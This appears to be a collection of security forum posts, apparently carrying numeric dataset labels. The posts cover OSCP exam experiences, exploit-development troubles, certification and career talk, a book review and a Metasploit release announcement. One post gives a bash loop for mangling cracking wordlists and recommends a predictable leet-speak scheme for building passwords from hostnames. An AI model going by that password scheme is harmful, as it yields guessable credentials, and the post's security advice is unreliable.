it will be less informative then the previous posts i made but i want to give you all a view on how i stand thowards the exam, mental wise. i cant stop thinking about the score hit monkey got on his first try. i believe we are skillwise pretty equal. giving the fact i am only in security for about 1.5 years now, i almost cant believe how far i already came, but the big question is will it be enough? i really want to pass the exam just to prove i learned all these skills and that i can put them in use. at this moment i feel pretty confident about the knowledge i have optained. the one thing that worries me most is the time window in which i have to operate. because i am on almost the other side of the earth, none of the starting times are great. you have the option of choosing several starting times going from 4pm to about 22pm. this means you will have to pull an all-nighter, no matter how good you are. this gives the whole experience a nice ring to it though. pulling an all nighter just like real hackers do in movies. can you imagine the dark room, lighted by just a computer screen, and the only sound you hear is the soft thicking of the keyboard and the brain cracking of a hacker that is working his ass off to get that root-shell? just thinking about it makes me all hyped up to get stared! luckily i took a day off (sort off) so i can prepare myself for this. im planning on getting plenty of food and drinks (caffeine is your friend is such situations) so i dont have to waste any time on less important things like if i have enough to fuel my body for this experience. after practicing in the labs i found out that if i really put myself to it, i can hack most of the hosts without any real problem. the only thing is that when i do, i dont have a time limit in which i have to finish. some of the hosts took me a really long time because of the extra knowledge required to make the actual hack. luckily not everything is chewed out so you really have to think on your own to achieve the result wanted. because of my slim pre-knowledge this takes me longer then with someone who has more experience. the best advice in these situation is just to try harder. in the end i get there, but with significantly more time and effort. i think time will be my biggest enemy. wish me luck and i will post my post exam experience when im ready to do something else besides sleeping. results are in: i got pwnd... no seriously...like a script kiddie. i cant really figure out what happened. maybe it was the long night, the fact i was more nervous then a bouncing toothpick, or perhaps just lack of skill? anyway the mail was right on time, i logged in, started on the first host and bam! 5 hours gone. i was almost there but decided to let it go cause time was ticking. i went for the other hosts where i pretty quickly got a shell on one of them, but spend hours to make it a root one. no luck. the other hosts were just playing with me. i found several vulnerable services, but somehow i couldnt get that shell. and then, times up. i got nothing! no shell, no exploit that worked for me. perhaps this was where my lack of programming skills came in. i spend too much time figuring out how to make the exploits run, let alone if they worked. i feel defeated, almost humiliated. even though somewhere i keep thinking wow, i cant believe how much i have learned in the past couple of months. at this point im having trouble to be entheusiastic about it, but thats just to blame on the exam results, and the 3h sleep i got. i expected it to be hard. heck, i was even sure i would need all the luck in the world to pass, but this result left me bedazzled. i guess this closes the ever ongoing ceh vs oscp debate. even if you can pass the ceh exam with two fingers up your nose, oscp is a whole different ballgame. this certification truely separates the men from the boys. the positive thing about this is that now i know where my weak points are. i will work on them first, expand my skills further, become more knowledgable and eventually i will succeed. i have never given up on anything in my life, and this will not become my first. i feel there is no point in taking the exam again any time soon, but when i feel i have progressed both skill and time wise, i will be ready for the biggest challenge of my life once more...i wish we could end this walkthrough with better news, but hey, guess i just have to: try harder... exam retake time... [quote] lets cut the crap about how nervous i was and uncertain if i would finally make it: i passed! i cant describe how happy i am that all that hard work finally payed off. i did a lot of research on the parts i messed up the first time, and after a lot of reading, practice and hard work all my effort got me where i wanted to be, an oscp. like i said before, time was my greatest enemy. it took me a heck of a long time to get the steps that i wanted to take to the commands to get them done. when i stumbled upon a nasty twist it just took me too long to figure it out, and that is mainly to blame on the fact im quite new to the game. i really enjoyed every minute of it. it is a great course where you will learn more then any other certification course, for sure. the material is clear, to the point, very well understandable for all skill levels and i recommend that if you decide to only do the exam, to take the course just to get an idea of what you can expect. besides that it is just plain fun to play around in a lab like that. the only remark i have is that the exam could be a little bit more in line with the course, cause some techniques i needed in the exam were not mentioned in the course. after all an exam is to test if you see if you master the material. however, you should be prepared to take the exam journey alone, cause no matter how hard you will try, nobody from the forums or irc channel will help you, no matter how hard you try  i am hooked on the way offensive security makes you think and work on your own. i discovered you can talk all you want about tools, techniques and hacking in general, you will only truly master it by doing it. i hope you had as much fun reading this as i had writing it, and do not be afraid to ask any questions about the course and exam. i would like to thank the guys at offensive security for this wonderful experience that i will stay with me forever, the admins at the irc channel for being patience with me and leaving me all by myself in that pit full of lions, snakes and other animals you do not want to be alone with, and last but certainly not least, eh.net and in particular don, for making all this possible for people like me, and by that i mean all of us. thank you [\quote] if anybody (don or the guys at offsec) has any remarks about this, please contact me
1;Frustrated with Shellcodestarted coding the war ftp 1.65 remote code exploit in python to exploit a win xp sp2 machine this morning and its still not finished:(. it went fine up until the point that shellcode had to be added. i managed to overwrite eip with my as and eventually with a jmp ebp from my usr32.dl file and even managed to put in my breakpoints where my shellcode was supposed to go, everything worked with ollydbg. but i kept failing at the shellcode which i generated with msfpayload. i spent the rest of the day playing around with differentâ  shellcodes trying to get the blasted thing to work, i played with different connecting shellcodes, vnc injects encoders and even filtering out bad characters, padding with nops and the blasted thing still wouldnt work. could anybody please provide me with any tips for shellcode. i understand the difference between types of shells e.g bind and reverse but the different encoders are throwing me off. could i have just missed a bad character somewhere. any help would be much appreciated thank
0;Steps to hack a networkk, heres the deal. i am having an hard time getting into many servers in the oscp lab and i feel like a "chicken with no head"! let me abstract the problem a bit. i have 2 questions: 1) once you have enumerated a network, lets say there are 10 different servers, how to you proceed to exploit them? time is precious and i feel like i go everywhere, try one service on server a, then trying another server on server b, and so on. for example, do you try all ftp servers, then all http servers, etc or do you try all services on one machine then you go to the next one?  2) if you have a single host to root, how do you proceed? would you go, in order (if applicable!):  a) reconnaissance b) scanning (nmap, nessus, nikto) c) attack smb, use metasploit, hydra d) if c) didnt work out, look for sql injection vulnerabilities e) if d) didnt work out, try fuzzing  f) ... i stuck after c)... i know it really depends on which services are available on a server, but generally, how do you proceed? i am tired...

0;Storing and Retrieving Strong Passwords Securelyfter reading the post on "storing passwords" ( http://www.ethicalhacker.net/component/ ... .msg30644/ ) i decided to come up with a quick and dirty write-up for engineers/admins to always remember their password. ill call it "storing and retrieving strong passwords securely" so should anyone want to copy it or bookmark it feel free to do so. first and foremost, the biggest hard drive on the planet is your mind. reliance on technology - while almost second-nature at this point - isnt always the best option. hopefully this will assist you in being able to 1) create a strong password 2) remember multiple passwords (to the tune of dozens even hundreds) 3) secure those passwords (after all no one can pick your brain). for those searching for "password storage systems" there are no shortages to find many helpful even free programs [1,2,3,4]. there are also no shortages on documents explaining why or how to create strong passwords [5]. what i noticed in most documents and even programs is their lack of creativity. lets be realistic, no one wants to remember $#.()p@%//\\- as a password. this would be an interesting form of mental punishment. not only would it be mental punishment, but imagine for a moment the following scenario: you need a key safe to store your keys. you go out and buy the strongest one and lose the key... now what? lets take a look at a small shop, say 20 servers. all have a distinct role and we want to keep all machines with a different password on each. we want to do so in the event someone compromises the machine, theyre stuck to that specific machine. or, maybe we just want to torture ourselves and have different passwords. lets lay out the framework for this company well now name forgetful inc.  forgetful inc. has ten servers running database instances for 5 credit card companies with each server having a redundancy. lets name them: company1.forgetfulinc.com, company1bu.forgetfulinc.com, company2.forgetfulinc.com, company2bu.forgetfulinc.com, company3.forgetfulinc.com, company3bu.forgetfulinc.com, company4.forgetfulinc.com, company4bu.forgetfulinc.com, company5.forgetfulinc.com, company5bu.forgetfulinc.com the also have 5 other servers for www, mail, active directory, clientserver, knowledgebase www.forgetfulinc.com , wwwbu.forgetfulinc.com, mail.forgetfulinc.com, mailbu.forgetfulinc.com, ad.forgetfulinc.com, adbu.forgetfulinc.com, clientserver.forgetfulinc.com, clientserverbu.forgetfulinc.com, kb.forgetfulinc.com, kbbu.forgetfulinc.com twenty servers, each with a unique password. each with a strong password wed never have to keep stored anywhere other than our brains. where should we start? for starters we will need (drum roll): a strong password. the rest is simple. it really boils down to creativity from here. well use password as our framework. (seriously, password will be our guide here). using character substitution well replace the a with an @ sign, the s with a dollar $ign, the o with a zer0. typical  "leet speak" leaving us with the password of: p@$$w0rd and this will be a starting point. because many experienced security engineers, hacker and crackers will likely have a good list of variants on words, we now move on to making this password more secure. using the fictitious domain name, we will do the same. the letter o becomes a zer0, any a becomes an @ sign, the letter i will become ! and so on. we now create f0rgetful!nc from forgetfulinc and we have the second piece. third piece? you got it, the hostname. mail becomes m@!l and were ready for a strong password that cant be forgotten: m@!l.f0rgetful!nc.p@$$w0rd  aka  mail.forgetfulinc.password we now have something that is extremely difficult almost impossible to guess let alone run any kind of wordlist against. we also have something extremely difficult to forget, after all if you forget your hostname and domain name, you need more than a password keeper. for each server we will go through the motions. 20 different servers, each with a unique password almost impossible to crack. the key is to find a suitable password combination. you could use mac addresses, passwords, etc., whatever you need to do to remember it. it gets easier after a while. so how does this apply elsewhere. on the personal side of things, lets look at what i perceive to be the average amount of passwords a typical person would have. id say 1 for work, 1 for personal e-mail, 1 for say a social networking site, maybe another for twitter or some other site. lets say 4 passwords. an issue with people is one of "ease of use" which is where the person will think "no one would ever guess my password is...", since many here are in the security field, i will tell you some of the things ive done to my wordlists which are gbs in size: reversed entire words massive amounts of regular expressions s:a:a:g;s:a:@:g;s:a:4:g;s:e:e:g;s:e:3:g;s:e:/=:g and the list goes on.  massive amounts of compound words using paste massive rehashing of the above with numbers before and after. e.g.: for i in `cat massive_wordlist` ; do for j in `seq 1 2010` ; do echo $i$j ; done ; done lets see how the last line works for those curious:     code: strategos ~ # cat massive_wordlist word-one word-two strategos ~ # for i in `cat massive_wordlist` ; do for j in `seq 1 5` ; do echo $i$j ; done ; done word-one1 word-one2 word-one3 word-one4 word-one5 word-two1 word-two2 word-two3 word-two4 word-two5 strategos ~ # for i in `cat massive_wordlist` ; do for j in `seq 100 105` ; do echo $i$j ; done ; done word-one100 word-one101 word-one102 word-one103 word-one104 word-one105 word-two100 word-two101 word-two102 word-two103 word-two104 word-two105 so imagine a 500 million wordlist with most numbered combined or appended to them. for those thinking about appending numbers and getting away with it, its not quite safe. anyway, back to the password game here. on the personal side of the spectrum, i stated that i needed to remember 4 distinct passwords. using the same context, here is a fictitious list of sites i have passwords for: hotmail, twitter, worksite, mybank. using the same principles: hotmail becomes h0tm@!l twitter becomes  tw!tt3r worksite becomes w0rks!t3 mybank becomes myb@nk my password? thisissecret: th!$!$$ecret combined?     code: h0tm@!lth!$!$$3cr3t tw!tt3rth!$!$$3cr3t w0rk$!t3th!$!$$3cr3t myb@nkth!$!$$3cr3t an eyesore? we could further add a period for a little more complexity: h0tm@!.lth!$!$$3cr3t tw!tt3r.th!$!$$3cr3t w0rk$!t3.th!$!$$3cr3t myb@nk.th !$!$$3cr3t definitely an eyesore, will take some getting used to, but we can create memorable, secure passwords for individual accounts, never store them and always recall them. its that simple. the hardest part is sticking with a regex you will always recall. too much complexity will leave you banging your head however, id even go as far as making a post-it (purposely because im a glutton for punishment) with the regexs and keeping that stored somewhere. e.g.: a@, s$, i!, e3 the one thing you can never forget is a password.   meaning dont be afraid to pick your favorite sports team, do it wisely, e.g.: @$tr0$.p@$$w0rd.h0tm@!l remembering passwords? piece of cake. on my laptop, i have a 38 character password combination. pain to type, easy to remember. secure as heck. every single account i have access to, all have a different password. all are well over the 20 character mark and i can recall them at will. takes some getting used to sure, but remember... youre brain is the safest storage system you have. encryption... different story altogether.

2;Could It Be Spam!i eh-netter,                 i am a sys admin at a small company in africa, i see to the day-to-day it needs of the company thus: emails, servers ,web updates, lan and man. beginning this year i have been experiencing some problems with our mail(outlook). description: our domain is being hosted by godaddy (including our email) for us to receive mail we point outlook to godaddys mx servers. but recently i noticed that when we send mail to each other they keep spamming e.g  me@mydomain.com  to  you@mydomain.com  will loop about 40-100 times, sometimes too when we send mails to other domains the call us or reply telling us how many times that particular mail was received. when my directors asked i attributed it to the fact that we had a slow internet connection due to that outlook cannot time out. other times too the recipient of the mail will receive it while the mail is still sitting in the outbox. note: at other branches with a satellite link of 64k dedicated we do do experience this problem there. with have 512k dedicate link at the head office where we experience the problem. i decided to build an internal email server with freebsd 8, but on the other side i dont know if it will work in my case cos our mails are being hosted elsewhere.  logic godaddy---------->my.internal.mail-------->outlook clients will the above be possible.  being a member of eh-net i think it would be a good idea if i post my problem  here for help cos im really worried. termigh
1;Windows 7 Password Retrievalhave given both my daughters windows7 netbooks for there homework and have set them as users and me as administrator. i have been hacked in the past by some local little sh....s and it now seems that it may have happened again. my admin passowrd on both machines seem to have changed which means i cannot alter there useage rights whilst on school holidays. i understand that it is possible to force a new administrator password but i would rather crack the existing one to confirm or not whether i have been hacked, or whether ive just got it wrong. i know what the current passowrds should be but i used there names and the word allowed and cannot with certanty say that im not gettgin it wrong. can anyone help before i end up spending hundreds sending it off for analysis. i can still get access to the machine via the kids accounts but would like to know one way or another for my own piece of mind. if i have been hacked then i know who itll be and will be cleaning off my baseball bat! :-

3;GREM Here I come...irstly i would like to thank everyone on the forum for voting for me for blackhat even though i could not attend. secondly, i would personally like to thank don and the ethicalhacker.net framework concept he has with this site. its not everyday that ive come across a site where i can learn from (because i do) and actually help others or at least try to share with others anything ive learned. with that said, along comes the long rambling (in usual fashion)  after winning julys contest, i was fortunate enough to be able to sign up for the grem in lieu of sec-542/sec-504. both those courses im almost positive are excellent courses however, im familiar with many core topics and have been moving more towards reversing so it made sense to at least beg sans to let me swap any of those for the grem. (alright so i just asked and they agreed). anyhow, for those who dont know me on a personal level or who havent corresponded with me via e-mail or other means, i have a dozen plus years of "professional" security experience under my wing. i initially started my foray into computing professionally circa 1991 at a financial institution where i assisted the fraud department in what was then chemical bank pre manufacturers hanover merger. from there i moved into the advertising industry (j walter thompson, grey direct) and into "pre-press" production where i got my taste of heavy unix based systems administration under a slew of different os (irix, next, system 7 (through 7.6 quadras baby!)) and all different types of networking, appletalk, novell, etc. my first forays into linux came after i had been using freebsd (2.0) in which i began using slackware followed by openbsd, qnx and other operating systems out of hobby (qnx, tru64, etc.). my main tasks begin in hardcore systems administration, upgrades, keeping things running, trying new things. my first *true* venture into computing though came via my then coleco vision adam    security came and comes way via a hobby, interest and self-teachings. there were friends in the realm of systems/security (back then), irc, "the internet", pre-internet were bbs, people like rsnake, tattooman, spikeman, chameleon, vacuum, bronc buster, sinnerz, technotronic, rhino9 and a slew of others ive had the fortune to learn from and with and sort of "grow up online with." id been fortunate enough to learn from a lot of people in the industry, many of which actually are csos now. back when i got started, there wasnt much via way of what there is today regarding security articles, books, etc., so the books i recall reading were from the beautiful minds of bellovin, blaze, cheswick, dorothy demming and others. my first true "hardcore" glimpse at security from a business standpoint came maybe in 95 from marcus ranum via the lisa conference where i heard about a system called aurora. around this time frame (94-96) i began finding and reading boatloads of information on security that interested me. i also began tinkering with tools like rscan, satan, tiger, autohack, cops. sites that i frequented back then, packetstorm when it was @ genocide2600 (greets to genocide, doxavg, ken and others), kwantaam pozetron, fravia and others. book after book, application after application. i was sold on determing how to secure whatever it was i was doing. in order to do so, i believed then and still believe now, one needs to understand how to compromise/break it. fast forward almost 20 years later, here i am. still reading, book after book, playing with application after application. attempting to and sometimes writing my own, still tinkering, still fascinated. ive watched and experienced the dotcom "daze" via way of metromedia fiber, starmedia, register.com and a few others. ive had my share of working for dotcoms, isps, msps and now an itsp where i am in charge of developing, deploying and administrating our managed security services. i keep my current employer out of the radar to avoid the downsides of the internet as ive experienced those downsides in a horrible way once upon a time. (for those wondering where i work, unless i explicitly tell you, good luck finding out). so what is it i do now. tough to explain... i work at a "services" based company. we offer a variety of things from voip trunking and interop, telecom billing, managed firewalls, routers, pentesting, assessments, etc., etc., etc., if it exists as an it service, we offer it. the breakdown of a typical of a typical day varies but i would place it at 40% security 20% networking 20% voip 10% systems administration/engineering 10% vendor/client/*other* meetings and conference calls. my environment: juniper (sa, ssg, srx, junos(all types)), cisco (almost anything and everything), avaya, nortel, foundry, sonicwall, session border controllers, and this list could be long enough to make someone puke. because of my environment, i love being able to dabble with anything and everything. it definitely has allowed me to learn a lot more than staying static at another company (we only use cisco... well we only use juniper!). anyhow, ive been fortunate through the years and have my share of unfortunate circumstances as well. this is life though   what do you do when youre handed lemons, you either make lemonade. with this said, i will keep the rambling down and try my best to post on the steps im taking to learn and understand grem content. ive got 4-5 months to play with and get myself ready. so why grem?!? well, ive been doing penetration testing for a while before it became a hot topic (my first professional pentest as in 99 to be exact for back then the wwf via a managed service provider) so im comfortable with what i know. why not incident response / handling... been there done that. reverse engineering as a whole is an interesting topic let alone malware. because ive been slowly teaching myself reversing on the exploit side, it makes more sense for me to take this course. im hoping to understand more of the attack vectors used in that realm, to help me as a whole on the defensive realm (network, applications, sessions, etc.)  with the rambling aside, this month i decided to revisit it a lot of topics. two current books ajax security by billy hoffman (dusted off) and "the rootkit arsenal: escape and evasion in the dark corners of the system" bill blunden   stay tuned
3;OSCP - Progressi guys, ive been really busy lately doing my internship and the pwb v3.0 course!  i was getting worried because it took ages for me to finally hack something. but now i can say i successfully penetrated several machines. theyre all windows machines, but oh well. also i managed to reach another network with a bit of help from draid  the guys on irc are very helpful and they always steer me to the right direction without giving spoilers. ive carefully documented all exercises and most extra miles, which is a very time consuming task. ive studied all the material (labs and videos), and have about 17 lab days left to hack as much as possible. im still very thankful for getting this opportunity. ive already learned so muchâ    i might even pursue a security related career instead of development. before starting this course i knew i was going to become a software engineer..but now im not so sure  now its time to pwn some linux boxe

3;Old Paper, Relevant Topic - From ISTS at Dartmouth Collegeey guys, i was reading an  article  that i stumbled upon somehow, through my twitter timeline no doubt.  its from way back in 2004, but its all about cyberwarfare.  published by the guys at the institute for security technology studies, the article is entitled cyber warfare: an analysis of the means and motives of selected nation states. so it gives you the overview, it gives you the executive summary, then it goes on to talk about china, russia, iran, pakistan, india and north korea.  it is an academic document and thus littered with references to related readings that are (from what few i perused) also highly interesting (though some are dated).  theres some interesting discussion of asymmetric warfare (especially in response to the comparatively overwhelming power of the usas conventional military), information warfare, hacktivism (which is totally the word de jour) and the evolution of it networks in the us into a "strategic center of gravity." table 1, on page 22 / 142, strikes me as particularly interesting because it discusses a lot of critical topic areas both in the private and public sector.  the latter are more interesting, since the private sector was always going to respond in a more agile, speedier fashion out of necessity.   the list of public sector topic areas includes, but is not limited to: active cyber warfare units, available cyber warfare doctrine, computer emergency response teams (certs, if you will, heh), cyber crime prevention and investigation teams, government-run academic institutions with cyber programs, government-sponsored it projects, intelligence service capabilities, c4i information warfare capability (military command and control communications, computers and intelligence), and so forth. the article concerns itself more with the aforementioned nations and the threat they represent to the united states (and really the rest of the world) with their developing cyber warfare programs (and chinas blue team is already somewhat well-known at this stage), so im compelled to ask, how well do you think the us (or anyone else that you care to discuss) is mobilizing to deal with this knew theatre (yes, theatre, im canadian) of warfare
3;How to pass HR screenings: load up on certs or go back to school?pology : i would like to first apologize since i know question is similar in nature to questions that have been asked before.  i have read the similar posts, but i dont feel they answer my question.  as a result, i have decided to "beat a dead horse" in hopes to drum up the answer im searching for. my background:  i started working with computers when i was 16 years old and started my own business at the age of 17 fixing computers/networks in soho settings.    in 2001 i was off to college to study for a bs in cs.  i had tons on my plate during this time (school full-time, work full-time, commuting to school), so i dropped out of school.  in 2006 i went back to school and finished my ba in political science/government (instead of cs) and graduated in june 2009. while in school, i worked at a computer repair shop.  there, i learned how to preform data recoveries, identify in-the-wild malware (no virus definition to remove it), windows operating systems (98-7), hardware, networking, some windows server stuff, some mac osx, and some *nix. for the last six months i have been working as the corporate it person for an internet company on the california central coast.  we run windows, mac, and linux desktops.  i manage 2 windows 2003 servers, a voip phone system, and 5 switches.  my job is pretty cool, but there was almost no learning curve for me since these are all things i have worked with in the past.  if any thing, it was a lot of shaking off the dust.   where im going with this:  ultimately, i would like to be a network and server pentester or security engineer.  i want to learn to bypass firewalls and gain access to servers.  why?  it seems like a job i could never get bored with and would always be challenged.  it sounds fun and totally cool.  i would like to be working at as systems administrator in the next 6-9 months.  from what i have come to understand, the systems administration experience will greatly help when it comes to pentesting similar systems.  when i interviewed for my job there was mention of this being a possibility, but i would rather feel like i have control of my career.   i have read the posts with similar topics: http://www.ethicalhacker.net/component/ ... ic,5818.0/ http://www.ethicalhacker.net/component/ ... ic,5825.0/ http://www.infiltrated.net/pentesting101.html these posts are great, but i dont feel they quite address the question im about to ask. my question (finally):  when im off day dreaming and looking pentesting jobs, i see a lot of requiring/preferring a bs in cs or network security.  i usually see:  12: education requirements: bachelor of arts/science or equivalent degree in computer science / security or related area of study 13: years of experience: eight plus years of experience with a degree/ equivalent experience without a degree will require eleven plus years of experience completion of a 4-year degree. technical focus preferred. so, would it be recommended/needed to get a bs in cs or network security to pass the hr screenings to be able to land a job in infosec?  i know / know of systems admins, data base admins, and network engineers who dont have technical college degrees or degrees at all.  but, when i see things like this, it gets discouraging.   i have been working on re-learning a lot of the things i fell out of practice with over the years.  im also going to start working on my alphabet soup (ccna security, lpi, security+ to start with) to build up some good fundamentals and go from there.  but, what i really want to know is: even if i have a bunch of the most respected infosec certifications, will that be enough to help me land a job pentesting networks and servers or in reality is it going to take a second bachelors? i dont really have an issue with racking up some more student loans, and i would just do night/online classes to get the degree (i figure it would take 1.5-2 years).   im open to recommendations and suggestions, and appreciate any and all advice.   edit: im also hoping to have seriously killed this horse, once and for all
3;Book Review: Dissecting the Hack: The F0rb1dd3n Networko im late getting this out....  syngress was really late getting the book out, so were close to even.  better late than never though and i especially appreciate the book, it was a joy to read. this book is broken into two sections.  the first section is a fictional story about a penetration event.  the author went out of his way to cover all the bases: nation state hacking sponsors, the feds, geek kids who get in over their heads, industrial espionage, insider threats, and probably some ive missed.  the second section is a walk-through of the terminology and techniques used in hacking events in the book.  enough to get the idea and pointers on where to go for more information.  it isnt hacking exposed style reading where the authors are trying to walk you through the steps needed to replicate the technique.  think more from a higher level of the "so what" factor that management often misses. lets face it, the author isnt going to win any awards for the fictional story.  it was readable, but it isnt holding court with dean koontz.  it is however technically accurate in almost every regard, something that most good fiction isnt.  also, smattered throughout the fiction are notes on where to find the associated content in the second portion of the book.  this is where the book really comes out on its own.  it is a readable piece of technically accurate fiction that has immediate links to more in depth resources in the back of the same text.  if the topic interests you or you dont understand, simply hop to the back of the book, read a page or two and then jump back in with a working understanding of what is going on. the two book sections are named star (security threats are real) 1.0 and 2.0.  this should give you an idea of who the book was written for (disbelievers).  i cant say that i learned a lot reading this book, but ive been in the business for more than a decade.  that doesnt mean im sorry i read the book.  again, the fiction was entertaining and i have a new tool in my arsenal when dealing with uninformed management.  no joke, the next time i get questioned on something covered in this book, im going to recommend the book to management and then ask them to come talk to me again afterward (and hopefully before making drastic policy decisions).  i think all of us have dealt with far too many ctos that dont know security (and arent backed by a good ciso).  this is a good primer to get them to understand the threats involved and even some of the lingo.  the fiction portion was a little over 100 pages and could easily be digested in a good night of reading.  even with none of the technical backing, id still rather talk to a cto who read (and appreciated) the fiction portion than nothing at all.  system admins without security knowledge are becoming more rare these days, but they would also benefit from this book.  i mean that seriously, even "security aware" system admins often dont understand the range of topics this book covers.  just having the knowledge of whats out there makes you a better administrator. an added bonus was a nice list of conferences in the back of the book with mini-reviews of each.  if you are new to the field, this might be worth looking at. overall, this is a book that needs the right audience.  if you are just getting into the game, buy the book.  you are guaranteed to learn something and be entertained at the same time.  if youve been in the security field more than a couple of years, you probably wont learn much from this, but id recommend you invest in a "loaner copy" for the reasons stated above.  id give this 4.5/5 for passing to management, a 4/5 for those just getting in the field, and a solid "buy this as a loaner book" for anyone whos been around.  its cheap, so it will pay for itself (in time and frustration saved) after loaning it once. former33t - aka jake william
2;Engineers Slam Internet Censorship Bill Ahead of Key Senate Panel Voteeres a topic worthy of starting of the ethical hacktivism board. share your thoughts, ideas, advantages or disadvantages of such a bill, recommendations on what to do about it... let your voices be heard. internet entrepreneurs are in a panic over a fast-tracking senate bill they say will censor the web, stifle silicon valley startups, damage the united states credibility on free speech and ultimately trigger the creation of an alternate-universe internet.  the west coast engineers say they were blindsided last monday when the combating online infringement and counterfeits act was introduced in the senate judiciary committee. the bill, which could come up for a vote as early as thursday, has a bipartisan roster of co-sponsors who say it will be a tool for stopping the worst offenders in the world of online piracy.  the bill would give the attorney general new powers to shut down websites deemed dedicated to counterfeit material -- by going through the courts and by encouraging service providers to go after sites the justice department puts on a public blacklist.  according to the bill, a website would have to be "dedicated to infringing activities" to trigger the enforcement.  but internet advocates warn the legislation would open a door for a handful of people in the federal government to wantonly power off entire websites that may be operating legally under current law. though senators suggest the bill would save jobs by cracking down on piracy, critics say it will hurt the economy by threatening fledgling companies whenever copyrighted material shows up on their sites.  "if this bill had been law five or 10 years ago, theres a good chance that youtube would no longer be around," peter eckersley, senior staff technologist at the electronic frontier foundation, told foxnews.com.  eckersley said the bill would mark a drastic departure from current law by allowing the government not just to strip copyrighted material off an offending website, but to order the shutdown of a domain name altogether.  eighty-seven engineers who played a role in the creation of the internet have sent a letter to the judiciary committee urging it to sideline the bill.  "if enacted, this legislation will risk fragmenting the internets global domain name system (dns), create an environment of tremendous fear and uncertainty for technological innovation, and seriously harm the credibility of the united states in its role as a steward of key internet infrastructure," they wrote. "all censorship schemes impact speech beyond the category they were intended to restrict, but this bill will be particularly egregious in that regard because it causes entire domains to vanish from the web, not just infringing pages or files. worse, an incredible range of useful, law-abiding sites can be blacklisted under this bill."  the bills authors, co-sponsors and supporters disagree. they say its dedicated to the worst-of-the-worst -- that the justice department could not shut down a site without first winning approval from a federal court and that the bill protects website operators by giving them the opportunity to remove pirating activity to get their site back online.  "no one would dispute that online infringement and counterfeiting of american intellectual property drains the american economy and costs american jobs," senate judiciary committee chairman patrick leahy, d-vt., who introduced the bill, said in a written statement wednesday. "no one would defend websites, primarily based overseas, that are dedicated to infringing activities. we continue (to) welcome input from everyone on the best way to attack the problem, but ignoring the problem, or saying it is too complicated, can no longer be an option." for complete story: http://www.foxnews.com/politics/2010/09 ... -key-vote/ do
3;Countdown to the RWSP examhile i sit around and wait for the next week to go by, i figured id ramble on for a moment about the rwsp (real world security professional) certification i will be taking next week. for starters, sorry its been a busy september and october with work, volunteer work (csfi.us), life, etc., i have not given up on the forums! anyhow, the rwsp caught my eye and i decided to head down to gaithersburg md to sit in for this exam. unlike the typical "read this book", "memorize this concept" style of exams which have flooded the market, the rwsp seems to me to be a "practice what you preach!", "you better know your stuff!" kind of exam. when i first read about the rswp exam, i was contemplating the isrm certification (nsa iam/iem) for "red teaming" validation and the information caught my eye. now to be honest here, when i first thought of the name of the certification, i was puzzled and wondered: "who the hell, what kind of ballsy statement is that!" and i immediately tracked down the exam content authors to question them about this certification. none other than russ rogers took the time to eloquently explain it to me: the rwsp is based on an individuals ability to handle and react to real world security situations.  we approach the security topic from both offensive and defensive perspectives, and no single student is required to be an expert in both sides.  over the years, weve grown frustrated with the growing number of "content based" certifications, where you read a book or take a course, then take the exam. we felt that the pool of certified professionals was being diluted by individuals that really dont have the experience and knowledge to do the work.  what we wanted to do with the rwsp is bring back some semblance of the peer review process (think of it like a blacksmith guild mentality).  if a certification is peer reviewed, the quality of the members is better maintained, thus the certification also maintains its value to the industry. for starters, if you dont know who russ rogers or greg miles is, then you probably havent been in the industry that long. the bios on them would fill this page up, so ill let you see for yourself  http://www.blackhat.com/html/bh-ad-10/t ... ldsec.html anyhow, i decided that this would be the "make me or break me" course in the sense that, no one is walking out of that classroom by relying on a book. the course is two days long and im getting antsy wanting to get it on already. the concept so far seems more in tune with reality as opposed to it being focused on tenteen hundred tools and exploits, eleventeen hundred methodologies, etc.. simple, attack and defend   my kind of exam. i will follow up after the exam (pass or fail) on how things went, etc. in the interim, im still around

1;Metasploit Framework version 3.5.0 released on anniversary of Rapid7 acquisitionhought you guys would love to know that  version 3.5.0 of metasploit framework is out . get your new download on  http://www.metasploit.com/ .  release notes:  http://www.metasploit.com/redmine/projects/framework/wiki/release_notes_35 this is just one day after we released metasploit pro ( http://www.rapid7.com/products/metasploit-pro.jsp ) official press release:  http://www.rapid7.com/news-events/press-releases/2010/2010-rapid7-metasploit-anniversary.jsp rapid7 and metasploit celebrate one year anniversary of the world’s most successful open source and commercial vendor collaboration partnership marks one million unique downloads and updates of the metasploit framework, five-fold community expansion, faster release cycles and quality assurance, and commercial product introductions boston, mass. – october 20, 2010 – rapid7®, the leading provider of unified vulnerability management and penetration testing solutions, today celebrates the one year anniversary of its acquisition of the metasploit® project, the open source penetration testing platform and the de facto standard for security testing with the worlds largest database of public, quality-assured exploits. undoubtedly the most successful collaboration between an open source project and a commercial vendor, the rapid7 and metasploit relationship has spurred one million unique new downloads and updates of the metasploit® framework, supported a thriving community that has grown five times in size and embraced faster release cycles, and introduced two successful commercial products within the last 12 months. "the metasploit project started as a hobby many years ago and, over time, transformed into a robust, community-driven project. with the acquisition last year, rapid7 brought additional resources that allowed us to expand the metasploit framework even further, turning it into the de facto standard for penetration testers and bringing the art of security testing to the masses with commercial products," said hd moore, rapid7 cso and metasploit chief architect. "its amazing to see that the community has embraced the vendor support and collaboration by contributing to the metasploit framework and turning to metasploit express and metasploit pro for even more advanced capabilities. with rapid7s commitment to open source and the communitys staggering growth, this has been a very successful partnership."  this year, moore and the metasploit team have been able to dedicate full-time resources to deliver faster release cycles of the metasploit framework, which has resulted in more than one million unique downloads and updates over the past 12 months. the metasploit framework, now in version 3.5, has been updated with 292 additional exploits and 207 auxiliary modules, an increase of 91 and 209 percent respectively since version 3.2, the current version at the time of the acquisition. version 3.5 includes more than 600 exploits, enhancements to the meterpreter script design and a revamped msfcli interface to run background exploits, plus much more. as a result of the faster releases and additional exploit information, penetration testers now have earlier access to the same information that hackers are using to compromise business-critical it infrastructure, including exploits found in the wild. this year, the metasploit team discovered and added notorious exploits, including dll hijacking and vxworks, which have impacted enterprises and security professionals since being reported. now, with a consistent quality assurance cycle, all releases and exploits, including those in the wild, are guaranteed safe to use for attack simulation on systems. "as a long time contributor to the metasploit project, i was concerned when rapid7 first announced the acquisition about what it meant and what would happen next. thankfully, those fears subsided as i immediately started seeing a faster development cycle with more features, fewer bugs and enhanced quality code," said carlos perez, a metasploit project contributor and security professional at a large technology company. "at the same time, i realized that rapid7s support enabled a more engaged user community because the developers could finally dedicate more time to the project and the community around it.  through this ongoing dedication to the community, rapid7 has provided a clear example on how to manage an active open source project and help it to grow and be profitable at the same time, and i look forward to their continued involvement in the future." in addition to contributing to the community, rapid7 and the metasploit 